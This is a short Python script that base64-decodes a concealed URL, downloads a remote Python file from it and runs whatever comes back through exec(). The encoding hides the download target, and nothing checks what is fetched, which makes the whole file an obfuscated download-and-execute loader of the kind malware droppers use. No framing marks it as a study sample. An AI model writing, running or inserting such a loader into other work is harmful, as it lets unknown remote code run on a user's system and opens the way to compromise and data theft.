import base64
import requests

def retrieve():
    encoded_url = "aHR0cDovL2NvbnRlbnQubWVkaWFzaGFyZS5vcmcvbWVkaWEvcHl0aG9uX3NjcmlwdC5weQ=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def run(code):
    exec(code)

def main():
    code = retrieve()
    run(code)

if __name__ == '__main__':
    main()
